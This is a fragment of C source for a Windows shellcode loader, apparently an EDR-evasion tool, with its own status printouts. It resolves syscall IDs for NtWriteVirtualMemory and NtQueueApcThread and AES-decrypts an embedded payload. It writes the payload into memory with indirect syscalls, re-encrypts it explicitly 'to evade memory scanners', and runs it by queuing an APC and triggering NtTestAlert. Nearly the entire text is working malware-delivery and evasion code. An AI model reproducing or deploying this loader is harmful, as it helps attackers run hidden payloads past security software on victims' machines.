    UINT_PTR pNtWriteVirtualMemorySyscallID = (UINT_PTR)pNtWriteVirtualMemory + 4; // The syscall ID is typically located at the 4th byte of the function
    syscallID = ((unsigned char*)(pNtWriteVirtualMemorySyscallID))[0];
    printf("[+] Syscall value of NtWriteVirtualMemory : 0x%04x\n", syscallID);
    syscallAddr = (UINT_PTR)pNtWriteVirtualMemory + 0x12; // (18 in decimal)
    printf("[+] Address of NtWriteVirtualMemory syscall instruction in ntdll memory : 0x%p\n", syscallAddr);

    SIZE_T bytesWritten;
    // Use the NtWriteVirtualMemory function to write the shellcode into the allocated memory
    printf("[+] Writing real shellcode into the allocated memory with indirect syscall\n");
    AESDecrypt(payload, sizeof(payload), AESkey, sizeof(AESkey));
    indirect_sys(GetCurrentProcess(), allocBuffer, payload, sizeof(payload), &bytesWritten);
    AESDecrypt(payload, sizeof(payload), AESkey, sizeof(AESkey)); // re-encrypt to evade memory scanners

    printf("\n[+] Getting address of ntqueueapcthread\n");
    FARPROC pNtQueueApcThread = CustomGetProcAddress(hNtdll, ntqueue_Rotr32A);
    // Getting syscall value of NtQueueApcThread
    UINT_PTR pNtQueueApcThreadSyscallID = (UINT_PTR)pNtQueueApcThread + 4; // The syscall ID is typically located at the 4th byte of the function
    syscallID = ((unsigned char*)(pNtQueueApcThreadSyscallID))[0];
    printf("[+] Syscall value of NtQueueApcThread : 0x%04x\n", syscallID);
    syscallAddr = (UINT_PTR)pNtQueueApcThread + 0x12; // (18 in decimal)
    printf("[+] Address of NtQueueApcThread syscall instruction in ntdll memory : 0x%p\n", syscallAddr);

    printf("\n[+] Preparing the venoma\n\n");
    Sleep(10000);

    // Executing the shellcode with NtQueueApcThread
    printf("[+] Executing the shellcode with NtQueueApcThread with indirect syscall\n");
    HANDLE targetThread = GetCurrentThread();
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)allocBuffer;
    myNtTestAlert testAlert = (myNtTestAlert)(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), RTIME_HASHA("NtTestAlert")));
    indirect_sys(targetThread, (PVOID)apcRoutine, NULL, NULL, NULL, NULL);
    testAlert();
    printf("[+] Shellcode executed\n");

    getchar();
    return;
}



